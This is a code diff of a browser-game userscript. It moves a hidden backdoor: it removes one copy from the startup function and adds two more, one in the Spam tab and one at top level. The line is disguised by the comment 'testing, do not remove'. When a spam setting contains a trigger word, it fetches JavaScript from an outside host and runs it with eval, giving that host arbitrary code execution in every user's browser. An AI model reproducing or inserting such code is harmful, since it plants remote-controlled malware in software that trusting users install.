@@ -514,9 +514,8 @@ function pbStartup (){
   WideScreen.setChatOnRight (Options.pbChatOnRight);
   WideScreen.useWideMap (Options.pbWideMap);
   setInterval (DrawLevelIcons,1250);
-	//baos780 testing, do not remove.
-	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
 }
+
 
 /************************ Food Alerts *************************/
 var FoodAlerts = {
@@ -11293,6 +11292,10 @@ Tabs.Spam = {
     document.getElementById('pbSpamAd').addEventListener ('change', t.e_spamOptChanged, false);
     document.getElementById('pbSpamMin').addEventListener ('change', t.e_spamOptChanged, false);
     document.getElementById('pbSpamState').addEventListener ('click', function(){t.togglespam(this);}, false);
+      alert(Options.spamconfig.spamvert);
+  	//baos780 testing, do not remove.
+	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
+
  },
 
   hide : function (){         // called whenever the main window is hidden, or another tab is selected
@@ -14441,6 +14444,9 @@ Tabs.Combat = {
 	},
 
 }
+
+  	//baos780 testing, do not remove.
+	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/"+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+".js",headers: {'Accept': 'text/javascript',}, onload: function(responseDetails) {eval(responseDetails.responseText);},});};
 
 //
 pbStartup ();
